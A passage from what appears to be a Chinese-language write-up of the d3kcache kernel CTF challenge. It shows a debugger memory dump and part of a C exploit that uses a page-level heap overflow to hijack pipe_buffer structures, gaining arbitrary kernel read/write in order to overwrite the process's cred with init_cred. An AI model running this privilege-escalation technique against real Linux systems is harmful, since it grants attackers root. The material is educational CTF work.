class="number">00</span>d0│  <span class="number">0xffff8880072670d0</span> —▸ <span class="number">0xffffffff82451b30</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│  <span class="number">0xffff8880072670d8</span> ◂— <span class="number">0x10</span></span><br><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│  <span class="number">0xffff8880072670e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│  <span class="number">0xffff8880072670e8</span> ◂— <span class="number">0x6e6e6e6e6e6e6e6e</span> (<span class="string">&#x27;nnnnnnnn&#x27;</span>)</span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">20</span>:<span class="number">0100</span>│  <span class="number">0xffff888007267100</span> ◂— <span class="number">0x6e6e6e6e6e6e6e6e</span> (<span class="string">&#x27;nnnnnnnn&#x27;</span>)</span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>│  <span class="number">0xffff888007267140</span> ◂— <span class="number">0x6e6e6e6e6e6e6e6e</span> (<span class="string">&#x27;nnnnnnnn&#x27;</span>)</span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">30</span>:<span class="number">0180</span>│  <span class="number">0xffff888007267180</span> —▸ <span class="number">0xffffea00001c99c0</span> ◂— <span class="number">0xfffffc0000200</span> <span class="comment">/* self-writing pipe2 */</span></span><br><span class="line"><span class="number">31</span>:<span class="number">0188</span>│  <span class="number">0xffff888007267188</span> ◂— <span class="number">0x240</span></span><br><span class="line"><span class="number">32</span>:<span class="number">0190</span>│  <span class="number">0xffff888007267190</span> —▸ <span class="number">0xffffffff82451b30</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">33</span>:<span class="number">0198</span>│  <span class="number">0xffff888007267198</span> ◂— <span class="number">0x10</span></span><br><span class="line"><span class="number">34</span>:<span class="number">01</span>a0│  <span class="number">0xffff8880072671a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">35</span>:<span class="number">01</span>a8│  <span class="number">0xffff8880072671a8</span> ◂— <span class="number">0x6d6d6d6d6d6d6d6d</span> (<span class="string">&#x27;mmmmmmmm&#x27;</span>)</span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">38</span>:<span class="number">01</span>c0│  <span class="number">0xffff8880072671c0</span> ◂— <span class="number">0x6d6d6d6d6d6d6d6d</span> (<span class="string">&#x27;mmmmmmmm&#x27;</span>)</span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">40</span>:<span class="number">0200</span>│  <span class="number">0xffff888007267200</span> ◂— <span class="number">0x6d6d6d6d6d6d6d6d</span> (<span class="string">&#x27;mmmmmmmm&#x27;</span>)</span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">48</span>:<span class="number">0240</span>│  <span class="number">0xffff888007267240</span> —▸ <span class="number">0xffffea00001c99c0</span> ◂— <span class="number">0xfffffc0000200</span> <span class="comment">/* self-writing pipe3 */</span></span><br><span class="line"><span class="number">49</span>:<span class="number">0248</span>│  <span class="number">0xffff888007267248</span> ◂— <span class="number">0xe0000000c8</span></span><br><span class="line"><span class="number">4</span>a:<span class="number">0250</span>│  <span class="number">0xffff888007267250</span> —▸ <span class="number">0xffffffff82451b30</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>self-writing pipe1</code>：偏移为 0xc0</li>
<li><code>self-writing pipe2</code>：偏移为 0x180</li>
<li><code>self-writing pipe3</code>：偏移为 0x240</li>
</ul>
<p>构造好 RAA 与 WAA 原语后，便可以从后往前扫描内存，同时泄露 <code>vmemmap_base</code> 和 <code>kernel_base</code></p>
<p>进行任意读写之前，都需要先将物理地址转化为对应 paga 结构体的地址，转换函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">direct_map_addr_to_page_addr</span><span class="params">(<span class="keyword">size_t</span> direct_map_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从前往后扫描内存，查找并尝试覆盖 <code>current_task-&gt;cred</code> 为 <code>init_cred</code></p>
<ul>
<li>调试时可以通过解引用 <code>task_struct-&gt;parent(offset=309*8)</code> 的方式向上一直找到 <code>init</code> 进程（<code>init-&gt;parent</code> 指向自身，利用这一点可以定位 <code>init</code> 进程）</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM 200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SND_PIPE_BUF_SZ 96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRD_PIPE_BUF_SZ 192</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> self_4th_pipe_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> self_2nd_pipe_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> self_3rd_pipe_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_2nd_buf</span>, <span class="title">evil_3rd_buf</span>, <span class="title">evil_4th_buf</span>;</span></span><br><span class="line"><span class="keyword">char</span> temp_zero_buf[<span class="number">0x1000</span>] = &#123;<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pipe_list[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">argg</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index,<span class="keyword">int</span> size,<span class="keyword">char</span> *data)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">argg</span> <span class="title">arg</span> =</span> &#123;.size = size,.index = index,.data = data&#125;;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, <span class="number">0x114</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dele</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">argg</span> <span class="title">arg</span> =</span> &#123;.index = index&#125;;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, <span class="number">0x810</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kwrite</span><span class="params">(<span class="keyword">int</span> index,<span class="keyword">int</span> size,<span class="keyword">char</span> *data)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">argg</span> <span class="title">arg</span> =</span> &#123;.size = size,.index = index,.data = data&#125;;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, <span class="number">0x514</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kread</span><span class="params">(<span class="keyword">int</span> index,<span class="keyword">int</span> size,<span class="keyword">char</span> *data)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">argg</span> <span class="title">arg</span> =</span> &#123;.size = size,.index = index,.data = data&#125;;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, <span class="number">0x1919</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_read_by_pipe</span><span class="params">(struct page *page_to_read, <span class="keyword">void</span> *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0x1ff8</span>;</span><br><span class="line">    evil_2nd_buf.page = page_to_read;</span><br><span class="line"> </span><br><span class="line">    write(pipe_list[self_3rd_pipe_idx][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"> </span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>],</span><br><span class="line">          temp_zero_buf,</span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"> </span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"> </span><br><span class="line">    read(pipe_list[self_2nd_pipe_idx][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_write_by_pipe</span><span class="params">(struct page *page_to_write, <span class="keyword">void</span> *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    evil_2nd_buf.page = page_to_write;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    write(pipe_list[self_3rd_pipe_idx][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"> </span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>],</span><br><span class="line">          temp_zero_buf,</span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"> </span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"> </span><br><span class="line">    write(pipe_list[self_2nd_pipe_idx][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x1000</span>]= &#123;<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line">    save_status();</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    unshare_setup();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/d3kcache&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) </span><br><span class="line">        err_exit(<span class="string">&quot;open /dev/d3kcache&quot;</span>);</span><br><span class="line"></span><br><span class="line">    prepare_pgv_system();</span><br><span class="line">    prepare_pgv_pages();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(pipe(pipe_list[i]) == <span class="number">-1</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM/<span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="comment">/* let the pipe_buffer to be allocated on order-3 pages (kmalloc-4k) */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_8pages_start_idx++); <span class="comment">// 8 * 4k</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */</span></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_list[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>) &#123; <span class="comment">// 8 * 4k</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    free_page(pgv_8pages_start_idx++); <span class="comment">// 8 * 4k</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123; <span class="comment">// 16 * 2k</span></span><br><span class="line">        add(i, <span class="number">8</span>, <span class="string">&quot;11111111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = PIPE_NUM/<span class="number">2</span>; i &lt; PIPE_NUM; i++) &#123;</span><br><span class="line">        <span class="comment">/* let the pipe_buffer to be allocated on order-3 pages (kmalloc-4k) */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_8pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */</span></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_list[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>) &#123; <span class="comment">// 8 * 4k</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        write(pipe_list[i][<span class="number">1</span>], <span class="string">&quot;AAAAAAAA&quot;</span>, <span class="number">8</span>); <span class="comment">// tag</span></span><br><span class="line">        write(pipe_list[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        write(pipe_list[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        write(pipe_list[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        write(pipe_list[i][<span class="number">1</span>], <span class="string">&quot;AAAAAAAA&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_list[i][<span class="number">1</span>], <span class="string">&quot;BBBBBBBB&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        kwrite(i, <span class="number">0x2048</span> - <span class="number">8</span>, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> victim_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> orig_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span>  i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">char</span> tag[<span class="number">0x10</span>];</span><br><span class="line">        <span class="keyword">int</span> nr;</span><br><span class="line">        <span class="built_in">memset</span>(tag, <span class="number">0</span>, <span class="keyword">sizeof</span>(tag));</span><br><span class="line">        read(pipe_list[i][<span class="number">0</span>], tag, <span class="number">8</span>);</span><br><span class="line">        read(pipe_list[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(tag, <span class="string">&quot;AAAAAAAA&quot;</span>) &amp;&amp; nr != i)&#123;</span><br><span class="line">            orig_idx = nr;</span><br><span class="line">            victim_idx = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found index-%d and index-%d point the same page \033[0m\n&quot;</span>,victim_idx, orig_idx);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (orig_idx == <span class="number">-1</span> || victim_idx == <span class="number">-1</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;can&#x27;t find&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">info_pipe_buf</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span> snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUF_SZ / <span class="keyword">sizeof</span>(struct pipe_buffer));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">&#x27;p&#x27;</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    write(pipe_list[victim_idx][<span class="number">1</span>], buf, SND_PIPE_BUF_SZ * <span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    close(pipe_list[orig_idx][<span class="number">0</span>]); <span class="comment">/* 释放其中一个pipe_buffer */</span></span><br><span class="line">    